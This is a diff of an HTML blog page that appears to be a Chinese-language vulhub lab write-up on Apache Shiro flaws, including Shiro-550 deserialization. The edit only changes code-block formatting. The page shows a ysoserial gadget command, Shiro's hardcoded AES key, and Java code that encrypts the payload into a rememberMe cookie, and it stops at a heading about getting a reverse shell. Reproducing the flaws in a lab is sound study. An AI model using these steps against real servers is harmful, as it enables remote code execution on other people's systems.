@@ -17,7 +17,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  highlight: undefined,
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -164,8 +164,8 @@
 <li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863</a></li>
 </ul>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个搭载Shiro 1.0.0的应用：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
+<pre><code>docker compose up -d
+</code></pre>
 <p>环境启动后，访问<code>http://your-ip:8080</code>即可查看首页。</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接请求管理页面<code>/admin</code>，无法访问，将会被重定向到登录页面：</p>
 <p><img src="/../image/image-20240809142903369.png" alt="image-20240809142903369"></p>
@@ -181,15 +181,37 @@
 <p>对于shiro550，其漏洞的核心成因是cookie中的身份信息进行了AES加解密，用于加解密的密钥应该是绝对保密的，但在shiro版本&lt;&#x3D;1.2.24的版本中使用了固定的密钥。因此，验证漏洞的核心应该还是在于我们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;或者其他我们可以通过脚本工具爆破出来的密钥，那么shiro550漏洞才一定存在。<br><img src="/../image/image-20240810220221463.png" alt="image-20240810220221463"></p>
 <p>说明漏洞存在</p>
 <h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
+<pre><code>docker compose up -d
+</code></pre>
 <p>服务启动后，访问<code>http://your-ip:8080</code>可使用<code>admin:vulhub</code>进行登录。</p>
 <h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用ysoserial生成CommonsBeanutils1的Gadget：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.se</span><br></pre></td></tr></table></figure>
-
+<pre><code>java -jar ysoserial-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.se
+</code></pre>
 <p>使用Shiro内置的默认密钥对Payload进行加密：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.shirodemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;/path&quot;</span>, <span class="string">&quot;to&quot;</span>, <span class="string">&quot;poc.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">package org.vulhub.shirodemo;
 
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.codec.CodecSupport;
+import org.apache.shiro.util.ByteSource;
+import org.apache.shiro.codec.Base64;
+import org.apache.shiro.io.DefaultSerializer;
+
+import java.nio.file.FileSystems;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class TestRemember &#123;
+    public static void main(String[] args) throws Exception &#123;
+        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;/path&quot;, &quot;to&quot;, &quot;poc.ser&quot;));
+
+        AesCipherService aes = new AesCipherService();
+        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+    &#125;
+&#125;
+</code></pre>
 <p>这里不会配环境，就先用工具测试一下，去补一下环境搭建</p>
 <p><img src="/../image/image-20240811102311688.png" alt="image-20240811102311688"></p>
 <h3 id="构造cookie获取反弹shell"><a href="#构造cookie获取反弹shell" class="headerlink" title="构造cookie获取反弹shell"></a>构造cookie获取反弹shell</h3><p>这里就不用集成化高的工具，手工构造一下payload</p>
